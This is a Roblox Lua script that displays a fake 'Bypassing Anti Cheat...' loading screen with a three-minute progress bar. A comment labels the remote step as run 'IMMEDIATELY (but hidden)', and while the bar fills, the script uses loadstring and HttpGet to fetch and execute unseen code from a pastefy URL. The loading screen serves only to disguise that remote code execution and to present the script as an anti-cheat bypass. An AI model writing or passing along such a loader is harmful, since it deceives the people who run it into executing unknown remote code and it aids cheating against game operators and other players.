-- Create the loading screen
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local LoadingBar = Instance.new("Frame")
local LoadingBarCorner = Instance.new("UICorner")
local LoadingBarFill = Instance.new("Frame")
local FillCorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Percentage = Instance.new("TextLabel")

ScreenGui.Name = "AntiCheatBypassLoader"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame (Rounded & Draggable)
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
MainFrame.Size = UDim2.new(0, 300, 0, 100)
MainFrame.Active = true
MainFrame.Draggable = true  -- Makes window draggable

UICorner.Parent = MainFrame
UICorner.CornerRadius = UDim.new(0, 8)

-- Loading Bar Background
LoadingBar.Name = "LoadingBar"
LoadingBar.Parent = MainFrame
LoadingBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
LoadingBar.BorderSizePixel = 0
LoadingBar.Position = UDim2.new(0.05, 0, 0.6, 0)
LoadingBar.Size = UDim2.new(0.9, 0, 0.2, 0)

LoadingBarCorner.Parent = LoadingBar
LoadingBarCorner.CornerRadius = UDim.new(1, 0)

-- Loading Bar Fill (Progress)
LoadingBarFill.Name = "LoadingBarFill"
LoadingBarFill.Parent = LoadingBar
LoadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
LoadingBarFill.BorderSizePixel = 0
LoadingBarFill.Size = UDim2.new(0, 0, 1, 0)  -- Starts at 0%

FillCorner.Parent = LoadingBarFill
FillCorner.CornerRadius = UDim.new(1, 0)

-- Title Text ("Bypassing Anti Cheat...")
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.05, 0, 0.2, 0)
Title.Size = UDim2.new(0.9, 0, 0.3, 0)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "Bypassing Anti Cheat..."
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Percentage Text ("1%")
Percentage.Name = "Percentage"
Percentage.Parent = MainFrame
Percentage.BackgroundTransparency = 1
Percentage.Position = UDim2.new(0.05, 0, 0.5, 0)
Percentage.Size = UDim2.new(0.9, 0, 0.2, 0)
Percentage.Font = Enum.Font.SourceSans
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(200, 200, 200)
Percentage.TextSize = 16
Percentage.TextXAlignment = Enum.TextXAlignment.Right

-- Execute Pastefy script IMMEDIATELY (but hidden)
local success, err = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/DFO50PQj/raw"))()
end)

if err then
    warn("Script Error: " .. err)
end

-- Animate Loading Bar (0% to 100% in 3 minutes)
local loadTime = 180  -- 3 minutes in seconds
local startTime = tick()

local function update()
    local elapsed = tick() - startTime
    local progress = math.min(elapsed / loadTime, 1)
    local percent = math.floor(progress * 100)
    
    LoadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
    Percentage.Text = percent .. "%"
    
    if progress < 1 then
        task.wait(0.1)
        update()
    else
        ScreenGui:Destroy()  -- Remove loading screen after completion
    end
end

      update()  -- Start loading animation
